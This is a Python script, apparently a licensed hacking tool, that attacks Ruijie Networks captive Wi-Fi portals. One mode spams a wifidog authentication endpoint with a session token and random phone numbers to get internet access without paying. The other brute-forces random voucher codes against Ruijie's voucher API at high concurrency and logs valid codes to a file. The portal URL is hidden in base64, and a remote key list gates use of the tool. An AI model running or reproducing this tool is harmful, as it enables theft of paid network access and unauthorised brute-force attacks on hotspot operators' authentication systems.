import os
import re
import sys
import uuid
import time
import ping3
import base64
import random
import string
import asyncio
import aiohttp
import hashlib
import argparse
import requests
from datetime import datetime

# --- UI & COLORS ---
w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def Line():
    try:
        cols = os.get_terminal_size()[0]
    except:
        cols = 40
    print(f"{y}-" * cols + f"{w}")

def Logo():
    clear()
    logo = f"""{r}  __  __  ____  ______     ____  _ 
 |  \/  |/ __ \|  ____|   |  _ \| |
 | \  / | |  | | |__      | |_) | |
 | |\/| | |  | |  __|     |  _ <| |
 | |  | | |__| | |____    | |_) |_|
 |_|  |_|\____/|______|   |____/(_)
                                   
{g}              Created by MOEYU [ULTRA STABLE]{w}"""
    print(logo)
    Line()
    print(f"{w}[♠️] Created by Moe Yu")
    print(f"{w}[♣️] Telegram: @starlink112")
    print(f"{w}[♦️] Status: Fixed ID Locked")
    Line()

# --- FIXED ID SYSTEM (MAC Address မသုံးတော့ဘဲ စနစ်ကို ပြောင်းထားသည်) ---
def get_hwid():
    """ဖုန်းရဲ့ hardware အချက်အလက်တွေကို သုံးပြီး ပုံသေ ID ထုတ်ယူခြင်း (MAC မပါ)"""
    try:
        # MAC Address (uuid.getnode) ကို မသုံးတော့ပါ (အဲ့ဒါကြောင့် ID ခဏခဏပြောင်းတာပါ)
        # အစားထိုးအနေနဲ့ User ID, CPU count နဲ့ စက်ရဲ့ နာမည်ကို သုံးပါမယ်
        user = os.environ.get('USER', 'default')
        arch = os.environ.get('ARCH', 'unknown')
        cpu = str(os.cpu_count())
        
        # ဤအချက်အလက်များကို ပေါင်းပြီး Hash လုပ်ပါမယ်
        raw_id = f"{user}-{arch}-{cpu}-MOEYU-STABLE"
        fixed_hash = hashlib.sha1(raw_id.encode()).hexdigest()[:12].upper()
        return f"MY-{fixed_hash}"
    except:
        return "MY-STABLE-USER"

def check_license():
    Logo()
    my_hwid = get_hwid()
    # Github URL
    key_url = "https://raw.githubusercontent.com/hhtethtet277-svg/moeyu/refs/heads/main/key.txt"
    
    print(f"{b}[*] Your ID: {y}{my_hwid}{w}")
    print(f"{b}[*] Checking License...{w}")
    
    try:
        # Cache မမိအောင် Random Params ထည့်ဆွဲပါမယ်
        response = requests.get(f"{key_url}?t={time.time()}", timeout=15)
        if response.status_code != 200:
            print(f"{r}[!] Server Error! Check your Internet.{w}")
            sys.exit()
            
        data = response.text.splitlines()
        found = False
        
        for line in data:
            if "|" in line:
                db_id, exp_date = line.split("|")
                if db_id.strip() == my_hwid:
                    found = True
                    expiry = datetime.strptime(exp_date.strip(), "%Y-%m-%d")
                    if datetime.now() < expiry:
                        print(f"{g}[+] Verified! Expires: {exp_date}{w}")
                        time.sleep(2)
                        return True
                    else:
                        print(f"{r}[!] License Expired on {exp_date}{w}")
                        sys.exit()
        
        if not found:
            print(f"{r}[!] ID Not Registered!{w}")
            print(f"{y}[>] Send this ID to Admin: {w}{my_hwid}")
            sys.exit()
            
    except Exception as e:
        print(f"{r}[!] Connection Failed: {str(e)}{w}")
        sys.exit()

# --- CORE FEATURES ---
async def get_session_id(session, url):
    try:
        async with session.get(url) as r:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url)).group(1)
    except: return None

class InternetAccess:
    def __init__(self):
        self.url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()

    async def execute(self):
        Logo()
        async with aiohttp.ClientSession() as s:
            sid = await get_session_id(s, self.url)
            while True:
                try:
                    p = {'token': sid, 'phoneNumber': "".join(random.choice(string.digits) for _ in range(6))}
                    async with s.post('http://192.168.0.1:2060/wifidog/auth?', params=p) as res:
                        ping_st = await asyncio.to_thread(ping3.ping, 'google.com')
                        ms = int(ping_st*1000) if ping_st else '??'
                        print(f"{w}[{time.strftime('%H:%M:%S')}] Status: {g}{res.status}{w} | Ping: {g}{ms}{w}ms")
                except: pass
                await asyncio.sleep(1)

class VoucherCode:
    def __init__(self, l=6, s=50):
        self.l, self.s = l, s
        self.url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()

    async def login(self, s, sid, v):
        try:
            u = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
            async with s.post(u, json={"accessCode": v, "sessionId": sid, "apiVersion": 1}) as r:
                if 'logonUrl' in await r.text():
                    print(f'\n{g}[SUCCESS] {v}{w}')
                    open("success.txt", "a").write(v + "\n")
                else: print(f'{w}[*] Testing: {y}{v}{w}', end='\r')
        except: pass

    async def execute(self):
        Logo()
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.s)) as s:
            sid = await get_session_id(s, self.url)
            while True:
                ts = [self.login(s, sid, "".join(random.choice(string.digits) for _ in range(self.l))) for _ in range(self.s)]
                await asyncio.gather(*ts)

def main():
    check_license()
    p = argparse.ArgumentParser()
    p.add_argument("-o", "--option", choices=["code", "internet"], required=True)
    p.add_argument("-l", "--length", type=int, default=6)
    p.add_argument("-s", "--speed", type=int, default=50)
    a = p.parse_args()
    if a.option == "internet": asyncio.run(InternetAccess().execute())
    else: asyncio.run(VoucherCode(l=a.length, s=a.speed).execute())

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{r}[!] Stopped.{w}")
